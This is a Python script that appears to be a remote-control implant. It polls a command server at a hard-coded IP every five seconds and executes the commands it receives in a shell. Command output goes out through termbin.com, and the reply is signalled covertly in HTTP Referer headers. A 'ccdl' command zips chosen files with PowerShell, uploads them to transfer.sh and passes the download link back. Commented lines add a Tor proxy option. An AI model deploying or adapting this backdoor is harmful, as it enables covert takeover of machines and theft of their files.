#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT
import requests
import re
import socket
import time

server_ip = "192.168.1.24"
cmd_url_order = 'http://%s:5000/' % (server_ip)
cmd_url_answer = 'http://%s:5000/answer' % (server_ip)
hostname = socket.gethostname()
hostname_pattern = 'host:%s-00' % hostname
headers = {}
referer = {'Referer': hostname_pattern}
cache_control = {'Cache-Control': 'no-cache'}
headers.update(referer)
headers.update(cache_control)
check_cmd_1 = None

def recvall(sock, n):
	data = b''
	while len(data) < n:
		packet = sock.recv(n - len(data))
		if not packet:
			return None
		data += packet
	return data


def get_cmd():
	req = requests.get(cmd_url_order, headers=headers).content.decode().strip()
	if req == '':
		pass
	else:
		return req

def run_cmd(cmd):
	global server_ip, cmd_url_answer

	cmd_split = cmd.split('--')
	if cmd_split[1] == hostname:
		cmd = cmd_split[2]
		print(cmd)


		cmdsplit = cmd.split(' ')

		# =====================================
		# TRANSFERSH
		# 
		# note : si 1 lien est mauvais, tout fail 
		# =====================================
		if (cmdsplit[0] == "ccdl"):
			cmdargs_str = cmdsplit[1:]

			# build multiple directory string -> windows path object string 
			allpaths = ""
			for i in range(0, len(cmdargs_str)):
				allpaths += "(Resolve-Path " + cmdargs_str[i] + ")"
				if i != len(cmdargs_str) - 1:
					allpaths += ", "

			# print(allpaths)


			# =====================================
			# create the zip with powershell
			# =====================================
			run = Popen("powershell.exe -Command \"Compress-Archive -Path " + allpaths + " -DestinationPath tmp.zip -Force\"",
				 shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
			out = run.stdout.read()
			# print(out)


			# =====================================
			# transfer the zip with transfersh
			# =====================================
			if len(out) == 0:
				transfersh_url = "https://transfer.sh"
				filename = "tmp.zip" # in current directory
				download_url = ""

				with open(filename, 'rb') as data:
					conf_file = {filename: data}
					headers['Max-Days'] = str(1)
					r = requests.post(transfersh_url, files=conf_file, headers=headers)
					download_url = r.text
					print(download_url)


			# =====================================
			# send transfersh link via requests.get / post
			# =====================================
			# remove \n from header value download_url (CAUSES 500 ERROR)
			download_url = download_url.replace("\n", "")

			transfersh_header = {'Referer': hostname_pattern+" -- "+download_url}
			headers.update(transfersh_header)

			cmd_url_answer = 'http://%s:5000/answer' % (server_ip)
			req = requests.get(cmd_url_answer, headers=headers)
			# print(req.text)


			# =====================================
			# delete the zip via powershell
			# =====================================
			run = Popen("powershell.exe -Command \"Remove-Item tmp.zip \"",
				 shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
			out = run.stdout.read()
			# print(out)


		# =====================================
		# END OF TRANSFERSH
		# =====================================



		# =====================================
		# TERMBIN
		# =====================================
		run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()
		out = run.stdout.read()
		if not out:
			out = b'ok'
		# termbin_cnx = socks.socksocket() # TORPROXY
		termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True) # TORPROXY
		termbin_cnx.connect(('termbin.com', 9999))
		termbin_cnx.send(out)
		recv = termbin_cnx.recv(100000)
		termbin_url_created = recv.decode().rstrip('\x00').strip()
		print(termbin_url_created)
		termbin_header = {'Referer': hostname_pattern+" -- "+termbin_url_created}
		headers.update(termbin_header)
		# =====================================
		# END OF TERMBIN
		# =====================================


		try:
			push = requests.get(cmd_url_answer, headers=headers)
			print('executed')
			headers.update(referer)
		except Exception as e:
			print(e)
			pass
	else:
		print('not for me')
		 
while True:
	time.sleep(5)
	try:
		check_cmd = get_cmd()
		# if check_cmd != check_cmd_1 and type(check_cmd) != None :
		if check_cmd and type(check_cmd) != None :
			print("[+] Commande à envoyer : " + str(check_cmd))
			time.sleep(2)
			run_cmd(check_cmd)
			check_cmd_1 = check_cmd
			print("[!] Commande executée, consultez le dashboard")
			pass
	except Exception as e:
		print(e)
		pass